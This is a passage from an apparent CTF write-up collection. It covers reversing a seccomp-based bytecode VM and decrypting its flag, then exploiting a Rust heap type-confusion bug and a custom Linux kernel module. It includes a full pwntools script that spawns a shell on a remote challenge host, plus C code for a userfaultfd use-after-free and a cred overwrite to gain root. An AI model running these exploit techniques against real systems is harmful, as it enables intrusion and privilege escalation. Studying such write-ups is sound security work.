0x00 0x00 0x00000010 A = args[0] 0019: 0x2c 0x00 0x00 0x00000000 A *= X 0020: 0x15 0x28 0x28 0x00000000 goto 0061 [all other handlers omitted for brevity] 0061: 0x02 0x00 0x00 0x00000000 mem[0] = A 0062: 0x20 0x00 0x00 0x00000020 A = args[2] 0063: 0x07 0x00 0x00 0x00000000 X = A 0064: 0x60 0x00 0x00 0x00000000 A = mem[0] 0065: 0x7c 0x00 0x00 0x00000000 A \u0026gt;\u0026gt;= X 0066: 0x01 0x00 0x00 0x00030000 X = 196608 0067: 0x54 0x00 0x00 0x0000ffff A \u0026amp;= 0xffff 0068: 0x4c 0x00 0x00 0x00000000 A |= X 0069: 0x16 0x00 0x00 0x00000000 return A 0070: 0x06 0x00 0x00 0x7fff0000 return ALLOW This filter is used to implement arithmetic operations in the bytecode by hooking unused syscalls. For example, a getpgrp syscall is used to multiply two numbers. Since the result is only 16 bits wide, each 32bit operation calls the required syscall twice, once with a shift (third argument) of 0 and once with a shift of 16.\nWith the seccomp filter \u0026amp; handler reversed, it was now possible to apply more rules to the bytecode, reducing it to less than 600 instructions, of which most are the ones used to set up the filter itself, meaning that the unreversed part got reduced to roughly 300 lines.\nIn the remaining code there were 4 repetitions of code that looked very similar and a final block that applies some final operations on the input and prints the success message. The 4 repetitions are all the same except for some constant values which are used, making it look very similar to some sort of encryption algorithm. In fact, by analyzing it further (with the help of an strace log of the binary with a known input for debugging) it was possible to reimplement the algorithm in C, revealing that it was some sort of 32-round feistel network.\nAny feistel round can be inverted if the output and key are known. Since the key was hardcoded in the bytecode, this meant that given an output it could be decrypted to get the flag.\nThe last part of the bytecode, just before printing the final message, XORs each 4byte block of the encrypted flag with a constant value and calculates the OR of all the XORs:\nstrcpy \u0026amp;r9 0x217058 mov 0x0 r2 r3 = r9 ^ 0x4a9d3ffd r2 = r2 | r3 strcpy \u0026amp;r9 0x21705c mov 0x0 r2 r3 = r9 ^ 0xbb541082 r2 = r2 | r3 strcpy \u0026amp;r9 0x217060 mov 0x0 r2 r3 = r9 ^ 0x632a4f78 r2 = r2 | r3 strcpy \u0026amp;r9 0x217064 mov 0x0 r2 r3 = r9 ^ 0xa9cb93d r2 = r2 | r3 strcpy \u0026amp;r9 0x217068 mov 0x0 r2 r3 = r9 ^ 0x58aae351 r2 = r2 | r3 strcpy \u0026amp;r9 0x21706c mov 0x0 r2 r3 = r9 ^ 0x92012a14 This meant that the final value would be 0 if and only if the encrypted flag was equal to those constants, and so those were the best candidates to try decryption on. Indeed, by concatenating and decrypting them, we got the flag.\nFor reference, this is the decompiler code and the final decryption code:\nfrom struct import unpack u64 = lambda x: unpack(\u0026#39;\u0026lt;Q\u0026#39;, x)[0] with open(\u0026#39;sop_bytecode\u0026#39;, \u0026#39;rb\u0026#39;) as fin: data = fin.read() def getbit(data, idx): res = data \u0026amp; (2**idx-1) return res, data \u0026gt;\u0026gt; idx syscalls = { 0: \u0026#39;read\u0026#39;, 1: \u0026#39;write\u0026#39;, 9: \u0026#39;mmap\u0026#39;, 13: \u0026#39;rt_sigaction\u0026#39;, 39: \u0026#39;getpid\u0026#39;, 57: \u0026#39;fork\u0026#39;, 102: \u0026#39;getuid\u0026#39;, 104: \u0026#39;getgid\u0026#39;, 107: \u0026#39;geteuid\u0026#39;, 108: \u0026#39;getegid\u0026#39;, 110: \u0026#39;getppid\u0026#39;, 111: \u0026#39;getpgrp\u0026#39;, 157: \u0026#39;prctl\u0026#39;, 186: \u0026#39;gettid\u0026#39;, 218: \u0026#39;set_tid_address\u0026#39; } disasm = [] for i in range(0, len(data), 8): opcode = u64(data[i:i+8]) if opcode == 0: break sysno, opcode = getbit(opcode, 8) args = [] for _ in range(6): mode, opcode = getbit(opcode, 2) if mode == 0: idx, opcode = getbit(opcode, 4) args.append(f\u0026#39;r{idx}\u0026#39;) elif mode == 1: idx, opcode = getbit(opcode, 4) args.append(f\u0026#39;\u0026amp;r{idx}\u0026#39;) elif mode == 2: size, opcode = getbit(opcode, 5) imm, opcode = getbit(opcode, size+1) args.append(hex(imm)) else: break assert sysno in syscalls disasm.append([syscalls[sysno], *args]) #print(syscalls[sysno], \u0026#39; \u0026#39;.join(args)) # All rules return the number of lines used and the new line # set_tid_address value + prctl get_tid \u0026amp;dest -\u0026gt; dest = value def tid_prctl_mov(x): if x[0][0] == \u0026#39;set_tid_address\u0026#39; and x[1][0] == \u0026#39;prctl\u0026#39; and x[1][1] == \u0026#39;0x28\u0026#39;: val = x[0][1] dest = x[1][2] # Dereference if dest[0] == \u0026#39;\u0026amp;\u0026#39;: dest = dest[1:] else: dest = \u0026#39;*\u0026#39; + dest return 2, [\u0026#39;mov\u0026#39;, val, dest] return None # prctl SET_NAME str + prctl GET_NAME dest -\u0026gt; strcpy(dest, str) def prctl_name_strcpy(x): if x[0][0] == \u0026#39;prctl\u0026#39; and x[1][0] == \u0026#39;prctl\u0026#39;: if x[0][1] == \u0026#39;0xf\u0026#39; and x[1][1] == \u0026#39;0x10\u0026#39;: src = x[0][2] dest = x[1][2] return 2, [\u0026#39;strcpy\u0026#39;, dest, src] return None prctl_vals = { 22: \u0026#39;PR_SET_SECCOMP\u0026#39;, 38: \u0026#39;PR_SET_NO_NEW_PRIVS\u0026#39;, } def readable_prctl(x): if x[0][0] == \u0026#39;prctl\u0026#39; and x[0][1].startswith(\u0026#39;0x\u0026#39;): val = int(x[0][1], 16) assert val in prctl_vals return 1, [\u0026#39;prctl\u0026#39;, prctl_vals[val]] + x[0][2:] return None seccomp_ops = { \u0026#39;getgid\u0026#39;: \u0026#39;\u0026amp;\u0026#39;, \u0026#39;getuid\u0026#39;: \u0026#39;\u0026gt;\u0026gt;\u0026#39;, \u0026#39;gettid\u0026#39;: \u0026#39;|\u0026#39;, \u0026#39;getpid\u0026#39;: \u0026#39;+\u0026#39;, \u0026#39;getegid\u0026#39;: \u0026#39;-\u0026#39;, \u0026#39;getpgrp\u0026#39;: \u0026#39;*\u0026#39;, \u0026#39;getppid\u0026#39;: \u0026#39;\u0026lt;\u0026lt;\u0026#39;, \u0026#39;geteuid\u0026#39;: \u0026#39;^\u0026#39;, \u0026#39;fork\u0026#39;: \u0026#39;/\u0026#39; } def seccomp_rules(x): if x[0][0] in seccomp_ops.keys(): if x[1][0] != x[0][0]: return None if int(x[0][3],16) != 0 or int(x[1][3],16) != 16: return None a, b = x[0][1], x[0][2] op = seccomp_ops[x[0][0]] return 2, [\u0026#39;arith\u0026#39;, a, op, b] return None def arithmetic(x): if x[0][0] != \u0026#39;mov\u0026#39; or x[1][0] != \u0026#39;mov\u0026#39; or x[2][0] != \u0026#39;mov\u0026#39;: return None if x[3][0] != \u0026#39;arith\u0026#39; or x[0][1][0] != \u0026#39;\u0026amp;\u0026#39;: return None if x[0][2] != \u0026#39;*0x217022\u0026#39; or x[1][2] != \u0026#39;r0\u0026#39; or x[2][2] != \u0026#39;r1\u0026#39;: return None if x[3][1] != \u0026#39;r0\u0026#39; or x[3][3] != \u0026#39;r1\u0026#39;: return None dest = x[0][1][1:] a = x[1][1] b = x[2][1] op = x[3][2] return 4, [f\u0026#39;{dest} = {a} {op} {b}\u0026#39;] rules = [ tid_prctl_mov, prctl_name_strcpy, readable_prctl, seccomp_rules, arithmetic ] #rules = [] for rule in rules: i = 0 while i \u0026lt; len(disasm): try: res = rule(disasm[i:]) if res: used, res = res assert used \u0026gt; 0 disasm[i] = res for j in range(i+1, i+used): disasm[j] = [] match = True except IndexError: pass i += 1 disasm1 = [] for x in disasm: if x != []: disasm1.append(x) disasm = disasm1 disasm = \u0026#39;\\n\u0026#39;.join(\u0026#39; \u0026#39;.join(x) for x in disasm) print(disasm) #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; void round_fwd(uint32_t *_a, uint32_t *_b, uint32_t *k) { uint32_t a = *_a, b = *_b; uint32_t r2 = k[0], r3 = k[1], r4 = k[2], r5 = k[3], r9 = k[4]; uint32_t r6, r7, r8, r10, r11, r12, r13, r14, r15; r6 = a; r7 = b; r8 = 0; r10=0; for(int i = 0; i \u0026lt; 32; i++) { //r10 = 0; r8 = r8 + r9; r11 = r7 \u0026lt;\u0026lt; 4; r11 = r11 + r2; r12 = r7 \u0026gt;\u0026gt; 5; r12 = r12 + r3; r11 = r11 ^ r12; r12 = r7 + r8; r11 = r11 ^ r12; r6 = r6 + r11; r11 = r6 \u0026lt;\u0026lt; 4; r11 = r11 + r4; r12 = r6 \u0026gt;\u0026gt; 0x5; r12 = r12 + r5; r11 = r11 ^ r12; r12 = r6 + r8; r11 = r11 ^ r12; r7 = r7 + r11; r10 = r10 + 0x1; //r11 = r10 \u0026gt;\u0026gt; 0x5; //r11 = 0x1 - r11; //r11 = r11 * 0xab; //printf(\u0026#34;%d 0x%08x 0x%08x\\n\u0026#34;, i, r6, r7); } printf(\u0026#34;0x%08x\\n\u0026#34;, r10); a = r6; b = r7; *_a = a; *_b = b; } void round_bk(uint32_t *_a, uint32_t *_b, uint32_t *k) { uint32_t a = *_a, b = *_b; uint32_t r2 = k[0], r3 = k[1], r4 = k[2], r5 = k[3], r9 = k[4]; uint32_t r6, r7, r8, r10, r11, r12, r13, r14, r15; r6 = a; r7 = b; r8 = 0; for(int i = 0; i \u0026lt; 32; i++) r8 = r8 + r9; for(int i = 0; i \u0026lt; 32; i++) { r11 = r6 \u0026lt;\u0026lt; 4; r11 = r11 + r4; r12 = r6 \u0026gt;\u0026gt; 0x5; r12 = r12 + r5; r11 = r11 ^ r12; r12 = r6 + r8; r11 = r11 ^ r12; r7 = r7 - r11; r11 = r7 \u0026lt;\u0026lt; 4; r11 = r11 + r2; r12 = r7 \u0026gt;\u0026gt; 5; r12 = r12 + r3; r11 = r11 ^ r12; r12 = r7 + r8; r11 = r11 ^ r12; r6 = r6 - r11; r8 = r8 - r9; } a = r6; b = r7; *_a = a; *_b = b; } uint32_t k[4][5] = { {0x69a33fff,0x468932dc,0x2b0b575b,0x1e8b51cc,0x51fdd41a}, {0x32e57ab6,0x7785df55,0x688620f9,0x8df954f3,0x5c37a6db}, {0xaca81571,0x2c19574f,0x1bd1fc38,0x14220605,0xb4f0b4fb}, {0x33f33fe0,0xf9de7e36,0xe9ab109d,0x8d4f04b2,0xd3c45f8c} }; uint32_t vals[4][2] = { {0x152ceed2, 0xd6046dc3}, {0x4a9d3ffd, 0xbb541082}, {0x632a4f78, 0x0a9cb93d}, {0x58aae351, 0x92012a14} }; int main() { uint8_t _input[8] = {\u0026#39;h\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;a\u0026#39;}; uint32_t *input = (uint32_t *)_input; for(int i = 0; i \u0026lt; 4; i++) { input[0] = vals[i][0]; input[1] = vals[i][1]; round_bk(\u0026amp;input[0], \u0026amp;input[1], k[i]); //printf(\u0026#34;0x%08x 0x%08x\\n\u0026#34;, input[0], input[1]); for(int i = 0; i \u0026lt; 8; i++) putchar(isprint(_input[i]) ? _input[i] : \u0026#39;@\u0026#39;); } putchar(\u0026#39;\\n\u0026#39;); } Run run run # This writeup is available here.\nL\u0026rsquo;Obscurit√© # This writeup is available here.\nDual # Heap exploitation in Rust? Is there any hope? Yes if you implement your own Garbage Collector.\nThe program # The binary doesn\u0026rsquo;t have any hard mitigations:\nRELRO STACK CANARY NX PIE RPATH RUNPATH\tymbols\tFORTIFY\tFortified\tFortifiable\tFILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 3950) Symbols\tNo\t0\t12\tdual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0 The vulnerability # The struct of the Nodes of the Graph is:\nstruct Node{ id: u64, // 0x0 id of the node this_index: u64, // 0x8 index of the current obj inside of the pool edges: Vec\u0026lt;u64\u0026gt;, // 0x10 ptr to the vector of neighbours last_edge: *u64, // 0x18 ptr to the last edge in the vector of neighbours edges_end: *u64, // 0x20 ptr to the end of the vector of neighbours text_len: u64, // 0x28 Len of the text text_index: u64, // 0x30 Index to the text obj in the pool stamp: u64, // 0x38 operation stamp (not really usefull for pwning) } After fuzzing playing with the binary we found out that using write_bin with length 0 causes a bug.\nfn write_bin(){ println!(\u0026#34;node_id\u0026gt;\u0026#34;); let node_id = read_int(); let node = match find_node(root, node_id) { Some(node) =\u0026gt; node, None =\u0026gt; { println!(\u0026#34;invalid\u0026#34;); return; } }; println!(\u0026#34;bin_len\u0026gt;\u0026#34;); let bin_len = read_int(); let bin_vals = read(bin_len); let (new_string, len) = encode(bin_vals, bin_len); // NO CHECK! node.text_index = add_pool(new_string); node.text_len = len; } fn encode(bin_vals, bin_len) -\u0026gt; (\u0026amp;str, u64){ if bin_len == 0 { // NULL == 0 return (NULL, 1); } ... } (Here we skip over a lot of details which are not relevant here.) Basically the write_bin function always add to the pool even if the encoding fails.\nThe garbage collector considers a cell free if its value \u0026gt;\u0026gt; 3 == 0 and this olds for NULL. Therefore we have a type confusion where we can have the same memory referenced as a text and a node.\ndef craft_node(_id, **kwargs): \u0026#34;\u0026#34;\u0026#34;Helper function to get the bytes of an arbitrary node\u0026#34;\u0026#34;\u0026#34; s = p64(_id) s += p64(kwargs.get(\u0026#34;this_idx\u0026#34;, 0x4141414141414141) s += p64(kwargs.get(\u0026#34;edges\u0026#34;, 0) s += p64(kwargs.get(\u0026#34;last_edge\u0026#34;, 0) s += p64(kwargs.get(\u0026#34;edges_end\u0026#34;, 0) s += p64(kwargs.get(\u0026#34;text_len\u0026#34;, 0x4141414141414141) s += p64(kwargs.get(\u0026#34;text_idx\u0026#34;, 0x4141414141414141) s += p64(kwargs.get(\u0026#34;stamp\u0026#34;,0x4141414141414141 ) return s def forge_node(**kwargs): # write an empty b64 to cause the bug in the node 0 write_bin(0, \u0026#34;\u0026#34;) # Create a new node which will be confused # with the text of the node 0 node_id = create(0) # Create the bytes for the arbitrary node crafted = craft(node_id, **kwargs) # Write it write_text(0, crafted) return node_id Now that we can forge arbitrary nodes we need to find a leak of the libc address and a write primitive.\nThe pseudo-rust of the connect_node function is:\nfn connect_node() { println!(\u0026#34;pred_id\u0026gt;\u0026#34;); let pred_id = read_int(); let pred_node = match find_node(root, pred_id) { Some(node) =\u0026gt; node, None =\u0026gt; { println!(\u0026#34;invalid\u0026#34;); return; } }; println!(\u0026#34;succ_id\u0026gt;\u0026#34;); let succ_id = read_int(); let succ_node = match find_node(root, succ_id) { Some(node) =\u0026gt; node, None =\u0026gt; { println!(\u0026#34;invalid\u0026#34;); return; } }; unsafe{ let mut ptr = pred_node.edges; // check if the edge was already inserted while ptr \u0026lt; pred_node.last_edge { if pool[*ptr] == succ { return; } } if pred_node.last_edge != pred_node.edges_end { // realloc pred_node.edges // and fix pred_node.last_edge // and pred_node.edges_end } // write what where primitive *pred_node.last_edge = succ_node.this_index; } } So if we can craft two arbitrary nodes, we can use connect_node to get arbitrary write.\nFor the libc leak we can do the usual unsorted bin leak (free a chunk into the unsorted bin, then read the pointer to the arena that will be placed in the heap).\nHere we create a node with arbitrary big text_len to be able to read out of bound, then allocate and free a chunk to read the heap-metadata of the freed chunk.\nnb = create(0) # Bug: write_bin with size 0 will return 1 instead of a pointer. write_bin(nb, \u0026#39;\u0026#39;) # This node can be overwritten with nb.text. n1 = create(nb) # Node that will be freed for the libc leak. n2 = create(nb) # Allocate \u0026gt;0x400 bytes so that the chunk will skip the tcache. write_text(n2, \u0026#39;X\u0026#39;*0x500) # Create another node to avoid consolidation with the top chunk. n3 = create(nb) # Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena. disconnect(nb, n2) gc() # Craft n1 so that we can read the pointers from the heap. crafted = craft(n1, text_idx=n1, text_len=0x100) write_text(nb, crafted) # Leak. leak = read(n1) The exploit # In the following code we will omit the primitives for simplicity sake, the complete script can be found here.\nNow that we can leak a libc address and we have a write-what-where primitive we can open a shell by either modifying the .got.plt or by overwriting one of the hooks in the libc. We chose to overwrite the __free_hook since it\u0026rsquo;s faster.\nSteps to get a shell:\nget the leak craft the nodes for the arbitrary write write the address of system in __free_hook create a text with /bin/sh\\x00 and then free it The full exploit:\nfrom pwn import * libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc-2.31.so\u0026#39;) host = \u0026#39;13.231.226.137\u0026#39; port = 9573 p = remote(host, port) # Step 1: leak libc base. # Prepare a root node for later. In the second step the DFS will go down here first, # so it won\u0026#39;t crash on the nodes we crafted in the first step. na = create(0) # Root node for step 1. nb = create(0) # Bug: write_bin with size 0 will return 1 instead of a pointer. write_bin(nb, \u0026#39;\u0026#39;) # This node can be overwritten with nb.text. n1 = create(nb) # Node that will be freed for the libc leak. n2 = create(nb) # Allocate \u0026gt;0x400 bytes so that the chunk will skip the tcache. write_text(n2, \u0026#39;X\u0026#39;*0x500) # Create another node to avoid consolidation with the top chunk. n3 = create(nb) # Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena. disconnect(nb, n2) gc() # Craft n1 so that we can read the pointers from the heap. crafted = craft(n1, text_idx=n1, text_len=0x100) print(\u0026#39;writing\u0026#39;, len(crafted), \u0026#39;bytes:\u0026#39;, crafted) write_text(nb, crafted) leak = read(n1) print(leak) leak_libc = u64(leak[160:160+8]) print(\u0026#39;leak arena:\u0026#39;, hex(leak_libc)) leak_offset = 2014176 # main_arena + 96 main_arena = 0x7ffff7c2cb80 # libc.symbols[\u0026#39;main_arena\u0026#39;] print(\u0026#39;main_arena\u0026#39;, hex(main_arena)) print(\u0026#39;leak_offset\u0026#39;, hex(leak_offset)) libc_base = leak_libc - leak_offset print(\u0026#39;libc base:\u0026#39;, hex(libc_base)) pause() # Step 2: write what-were to get a shell. libc.address = libc_base system = libc.symbols[\u0026#39;system\u0026#39;] what = system print(\u0026#39;system:\u0026#39;, hex(system)) free_hook = libc.symbols[\u0026#39;__free_hook\u0026#39;] where = free_hook print(\u0026#39;__free_hook:\u0026#39;, hex(free_hook)) # write_bin bug again to control a second node. write_bin(n3, \u0026#39;\u0026#39;) # This node can be overwritten with n3.text. n4 = create(na) # Prepare nodes for arbitrary write. wherenode = craft(n1, edges=where-8, last_edge=where, edges_end=where+32) whatnode = craft(n4, pool_idx=what) write_text(n3, whatnode) write_text(nb, wherenode) # Trigger arbitrary write. connect(n1, n4) pause() # Write in a chunk and trigger the free in write_text to call system(\u0026#34;/bin/sh\u0026#34;). write_text(nb, b\u0026#39;/bin/sh\\x00\u0026#39;) write_text(nb, \u0026#39;A\u0026#39;*1500, shell=True) p.interactive() Spark # Shortest Path AlgoRithm in Kernel!\nnc 3.113.76.29 9427\nThis challenge is a Linux VM with a custom kernel module, which exposes a new /dev/node device. The module allows building weighted graphs and calculating the shortest distance between two nodes.\nWhen we open the driver, the descriptor is backed by the following private_data:\nstruct node { uint64_t id; int refcount; struct mutex state_lock; int is_finalized; struct mutex nb_lock; uint64_t num_children; list_head edges; uint64_t traversal_idx; struct node_list *traversal; }; After opening a node, we can interact via ioctl. There are four ioctls:\nLink (0x4008d900): takes two node descriptors A and B, and a edge weight, and creates the edges A-\u0026gt;B and B-\u0026gt;A; Info (0x8018d901): provides information about the node; Finalize (0xd902): finalizes the graph rooted in the node, preparing it for queries; Query (0xc010d903): takes two node descriptors and calculates the total weight of the shortest path between them. When we create an edge (nodes can be linked only if not finalized), the following structure is allocated:\nstruct edge { struct edge *next; struct edge *prev; struct node *node; uint64_t weight; }; Where next and prev make up a list_head. The edge is then inserted in the struct node\u0026rsquo;s edges list.\nWhen we finalize a node, the driver performs a depth-first traversal of the graph rooted in the node. The list of nodes in DFS order is stored in the traversal list of the node. The index of each node in the DFS list is stored in that node\u0026rsquo;s traversal_idx.\nThe traversal list is a simple vector:\nstruct node_list { uint64_t size; uint64_t capacity; struct node *nodes; }; The query ioctl, which requires a finalized source node, allocates an array of distances of length equal to the source\u0026rsquo;s traversal list length. Then, it uses this working array to compute shortest-path distances until it gets to the shortest-path distance of the destination node, at which point it can return the answer.\nThere are a couple bugs.\nFinalizing a node will (correctly) increment the refcount of all nodes in the DFS traversal. However, linking two nodes will not increment their refcount. Therefore, if two nodes are linked and then one is closed, the surviving one will have an edge whose node field points to the other node\u0026rsquo;s freed struct node, i.e., a dangling pointer (which we could turn into UAF).\nMoreover, the traversal_idx is a property of the node, rather than of the traversal. This is only correct if a node can be in at most a single traversal, which is ensured by the finalization logic, which will mark every node in the DFS as finalized and stop when it encounters an already-finalized node. However, the query logic also uses a node\u0026rsquo;s children, not just the pre-calculated DFS traversal, when updating distances iteratively:\nfor every edge E in the current node\u0026#39;s edges: if distance[E-\u0026gt;node-\u0026gt;traversal_idx] != -1: new_dist = current_path_distance + E-\u0026gt;weight if new_dist \u0026lt; distance[E-\u0026gt;node-\u0026gt;traversal_idx]: distance[E-\u0026gt;node-\u0026gt;traversal_idx] = new_dist It\u0026rsquo;s possible to create a situation where a node has children in different traversals. For example, if A has children B and C, then by finalizing C and then A we\u0026rsquo;d get two traversals [C] and [A, B], so B and C are in different traversals. However, that query code assumes that children are always in the same traversal, because the traversal_idx is not checked in any way. By exploiting this, we can get a OOB write from the distance array.\nOur exploit is needlessly complex, but we blame sleep deprivation :)\nWe use the first bug (edge with dangling ptr) to cause a crash during a query. We reclaim the freed node using the setxattr+userfaultfd technique and we fake a node with a huge traversal_idx (resulting in a non-canonical access) to crash the query. This will not crash the kernel, but will print a panic to dmesg, which we can read, and leak a couple pointers: a node pointer, and the location of the distance array of the crashing query. Note that the array is freed after the query, but since the query crashed, it\u0026rsquo;s still allocated.\nThen, we shape the heap so that a query will allocate the distance array right before a node. We use the OOB in query to modify the node\u0026rsquo;s refcount. Then, we are able to free the node while still retaining a file descriptor to it. By reclaiming the freed node, we now have a primitive that gives us full control of a node structure that\u0026rsquo;s backing a live file descriptor. This is properly engineered to that we can repeatedly free and reclaim the node as many times as we want, so that we can change the structure contents at will.\nWe exploit the controlled node primitive to build an arbitrary read primitive. The info ioctl, along other values, also outputs us the size of the node\u0026rsquo;s traversal. Since we control the traversal field, this allows us to read a 8-byte integer from an arbitrary address (repeatedly). We use the read, coupled with the pointers we leaked earlier, to scan the heap and find our fake node (we put a unique marker as id). Then, since during the info ioctl the state_lock lock is held, we can read current from the mutex, and our task\u0026rsquo;s cred pointer from that.\nWe then abuse cleanup logic on a fake node to free the leaked distance array that was still allocated, so that the next (properly sized) query will reclaim it and thus put its distance array at the same known address. Querying a fake node also gives us control over traversal_idx, and so now the query OOB can be turned into an arbitrary write.\nWe use the write to overwrite our task\u0026rsquo;s UID in its cred to 0. Then, we can simply open the root-owned /flag and read it.\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;syscall.h\u0026gt; #include \u0026lt;linux/userfaultfd.h\u0026gt; #include \u0026lt;poll.h\u0026gt; #include \u0026lt;sys/xattr.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/klog.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;semaphore.h\u0026gt; #define DEV_PATH \u0026#34;/dev/node\u0026#34; #define SPARK_FINALIZE 0xd902 #define SPARK_LINK 0x4008d900 #define SPARK_QUERY 0xc010d903 #define SPARK_INFO 0x8018D901 struct spark_ioctl_query { int fd1; int fd2; long long distance; }; struct spark_info { unsigned long num_children; unsigned long traversal_idx; unsigned long traversal_size; }; static unsigned g_create_next_id; static int create() { int fd = open(DEV_PATH, O_RDONLY); assert(fd != -1); g_create_next_id++; return fd; } static void llink(int a, int b, unsigned int weight) { assert(ioctl(a, SPARK_LINK, b | ((unsigned long long) weight \u0026lt;\u0026lt; 32)) == 0); } static long long query(int a, int b) { struct spark_ioctl_query qry = { .fd1 = a, .fd2 = b, }; assert(ioctl(a, SPARK_QUERY, \u0026amp;qry) == 0); return qry.distance; } static void finalize(int a) { assert(ioctl(a, SPARK_FINALIZE) == 0); } static void get_info(int a, struct spark_info *info) { assert(ioctl(a, SPARK_INFO, info) == 0); } static void release(int a) { assert(close(a) == 0); } struct fault_arg { sem_t fault_sema; sem_t unblock_sema; void *addr; }; static void *fault_thread(void *arg) { struct fault_arg *param = (struct fault_arg *)arg; unsigned char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); assert(page != MAP_FAILED); page[0] = 0xff; // top byte for traversal addr // create a userfaultfd object int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); assert(uffd != -1); // enable the userfaultfd object struct uffdio_api uffdio_api; uffdio_api.api = UFFD_API; uffdio_api.features = 0; assert(ioctl(uffd, UFFDIO_API, \u0026amp;uffdio_api) == 0); // n_addr is the start of where you want to catch the pagefault. In our // case, we set it to the address of page 2 struct uffdio_register uffdio_register; uffdio_register.range.start = (unsigned long)param-\u0026gt;addr; uffdio_register.range.len = 0x1000; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; assert(ioctl(uffd, UFFDIO_REGISTER, \u0026amp;uffdio_register) == 0); assert(sem_post(\u0026amp;param-\u0026gt;fault_sema) == 0); struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; nready = poll(\u0026amp;pollfd, 1, -1); assert(nready != -1); struct uffd_msg msg; assert(read(uffd, \u0026amp;msg, sizeof(msg)) == sizeof(msg)); assert(msg.event == UFFD_EVENT_PAGEFAULT); assert(sem_post(\u0026amp;param-\u0026gt;fault_sema) == 0); assert(sem_wait(\u0026amp;param-\u0026gt;unblock_sema) == 0); struct uffdio_copy uffdio_copy; uffdio_copy.src = (unsigned long) page; uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address \u0026amp; ~0xfffUL; uffdio_copy.len = 0x1000; uffdio_copy.mode = 0; uffdio_copy.copy = 0; assert(ioctl(uffd, UFFDIO_COPY, \u0026amp;uffdio_copy) == 0); close(uffd); munmap(page, 0x1000); return NULL; } struct setxattr_arg { const void *buf; size_t size; }; static void *setxattr_thread(void *arg) { struct setxattr_arg *param = (struct setxattr_arg *)arg; assert(setxattr(\u0026#34;.\u0026#34;, \u0026#34;nonexistent\u0026#34;, param-\u0026gt;buf, param-\u0026gt;size, XATTR_REPLACE) == -1); return NULL; } struct reclaim_ctx { struct fault_arg fault_arg; struct setxattr_arg setxattr_arg; pthread_t setxattr_handle; }; static void reclaim_alloc_raw(struct reclaim_ctx *ctx, char *buf) { char *mem = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); assert(mem != MAP_FAILED); ctx-\u0026gt;fault_arg.addr = mem + 0x1000; assert(sem_init(\u0026amp;ctx-\u0026gt;fault_arg.fault_sema, 0, 0) == 0); assert(sem_init(\u0026amp;ctx-\u0026gt;fault_arg.unblock_sema, 0, 0) == 0); pthread_t handle; assert(pthread_create(\u0026amp;handle, NULL, fault_thread, \u0026amp;ctx-\u0026gt;fault_arg) == 0); assert(sem_wait(\u0026amp;ctx-\u0026gt;fault_arg.fault_sema) == 0); char *node = mem + 0x1000 - 0x7e; // memcpy could cross boundaries for (int i = 0; i \u0026lt; 0x7e; i++) node[i] = buf[i]; ctx-\u0026gt;setxattr_arg.buf = node; ctx-\u0026gt;setxattr_arg.size = 0x7f; // avoid copy_from_user 16b optimization assert(pthread_create(\u0026amp;ctx-\u0026gt;setxattr_handle, NULL, setxattr_thread, \u0026amp;ctx-\u0026gt;setxattr_arg) == 0); assert(sem_wait(\u0026amp;ctx-\u0026gt;fault_arg.fault_sema) == 0); } static void reclaim_alloc(struct reclaim_ctx *ctx, unsigned int is_finalized, unsigned long num_children, unsigned long traversal_idx, unsigned long traversal) { char buf[0x80]; memset(buf, 0, sizeof(buf)); *(unsigned int *)(buf + 0x8) = 1; // refcount *(unsigned int *)(buf + 0x30) = is_finalized; // is_finalized *(unsigned long *)(buf + 0x58) = num_children; // num_children *(unsigned long *)(buf + 0x70) = traversal_idx; // traversal_idx *(unsigned long *)(buf + 0x78) = traversal; // traversal reclaim_alloc_raw(ctx, buf); } static void reclaim_free(struct reclaim_ctx *ctx) { assert(sem_post(\u0026amp;ctx-\u0026gt;fault_arg.unblock_sema) == 0); assert(pthread_join(ctx-\u0026gt;setxattr_handle, NULL) == 0); } static void stage1_leak_dmesg(unsigned long *dist_addrp, unsigned long *edges_addrp) { int i, sz; char *buf; sz = klogctl(10, NULL, 0); assert(sz != -1); buf = malloc(sz); assert(klogctl(3, buf, sz) != -1); unsigned long dist_addr = 0, edges_addr = 0; for (i = 0; i \u0026lt; sz \u0026amp;\u0026amp; (!dist_addr || !edges_addr); i++) { if (!dist_addr \u0026amp;\u0026amp; !strncmp(buf + i, \u0026#34;RAX: \u0026#34;, 5)) { if (sscanf(buf + i + 5, \u0026#34;%lx\u0026#34;, \u0026amp;dist_addr) != 1) dist_addr = 0; } if (!edges_addr \u0026amp;\u0026amp; !strncmp(buf + i, \u0026#34;R09: \u0026#34;, 5)) { if (sscanf(buf + i + 5, \u0026#34;%lx\u0026#34;, \u0026amp;edges_addr) != 1) edges_addr = 0; } } assert(dist_addr \u0026amp;\u0026amp; edges_addr); free(buf); *dist_addrp = dist_addr; *edges_addrp = edges_addr; } // 